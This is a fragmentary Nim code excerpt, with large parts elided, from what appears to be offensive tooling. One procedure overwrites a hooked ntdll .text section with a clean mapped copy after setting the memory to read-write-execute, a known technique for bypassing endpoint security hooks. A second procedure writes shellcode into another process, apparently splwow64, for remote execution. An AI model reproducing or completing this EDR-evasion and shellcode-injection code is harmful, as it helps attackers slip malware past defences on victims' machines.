...
proc ntdll_mapviewoffile() =
  ...
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      ...
      if ".text" in toString(hookedSectionHeader.Name):
          ...
          var status = NtProtectVirtualMemory(processH, addr text_addr, &sectionSize, PAGE_EXECUTE_READWRITE, addr oldProtection)
          echo "[*] NtProtectVirtualMemory(RWX): ", RtlNtStatusToDosError(status)
          copyMem(text_addr, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          status = NtProtectVirtualMemory(processH, addr text_addr, &sectionSize, oldProtection, addr oldProtection)
          echo "[*] NtProtectVirtualMemory(oldprotect): ", RtlNtStatusToDosError(status)
...
proc splwow_crt(shellcode: openarray[byte]): void =
  ...
  echo "    \\-- bytes written: ", bytesWritten, " with sc_size ", cast[SIZE_T](shellcode.len)
  echo ""
